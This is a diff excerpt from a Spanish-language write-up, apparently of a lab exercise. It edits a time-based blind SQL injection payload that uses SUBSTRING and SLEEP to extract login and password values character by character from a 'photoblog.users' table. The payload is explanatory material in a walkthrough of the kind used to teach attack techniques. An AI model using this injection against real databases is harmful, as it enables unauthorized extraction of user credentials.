@@ -35,7 +35,7 @@ El siguiente script es usado para enumerar las tablas, sabiendo ya que son 4 y q
 ```
 Por último extraímos los valores de las columnas id, login y password en la tabla users de la base de datos photoblog.
 ```mysql
-1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
+1' OR IF((SELECT SUBSTRING('columna','posición',1) FROM photoblog.users LIMIT 'num_fila',1)='letra', SLEEP(0.043), 0) #
 ```
     
 ## Disclaimer
